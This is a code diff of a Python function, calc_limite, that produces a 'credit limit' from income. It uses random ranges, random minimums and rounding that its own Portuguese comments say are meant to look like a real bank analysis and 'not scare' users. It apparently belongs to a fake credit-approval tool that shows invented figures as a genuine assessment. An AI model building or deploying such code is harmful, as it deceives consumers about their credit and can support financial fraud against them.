@@ -645,15 +645,22 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     # Cálculo final do Limite
     limite = base_limite * estabilidade * fator_risco
     
+    # Teto máximo rigoroso de acordo com a renda
+    if r_val <= 1000:
+        # Se ganha 1000, limite não deve passar muito de 150 a 300
+        limite = min(limite, random.uniform(150, 300))
+    elif r_val <= 2000:
+        # Se ganha 2000, limite não deve passar de 400 a 700
+        limite = min(limite, random.uniform(400, 700))
+    elif r_val <= 4000:
+        limite = min(limite, random.uniform(800, 1500))
+    else:
+        # Acima de 4000, teto máximo fixado no sistema
+        limite = min(limite, random.uniform(1500, 2800))
+        
     # Limites Hardcodes de Segurança lógicos
-    if limite < 300: 
-        limite = random.choice([300, 400])  # Limite mínimo
-    
-    # Teto máximo saudável para não assustar
-    if limite > r_val * 1.2: 
-        limite = r_val * 1.2
-    if limite > 2800: 
-        limite = random.uniform(1500, 2800)
+    if limite < 150: 
+        limite = random.choice([150, 200])  # Limite mínimo absoluto
         
     # Arredondamento charmoso para parecer análise de banco real (finais em 00 ou 50)
     limite = round(limite / 50) * 50
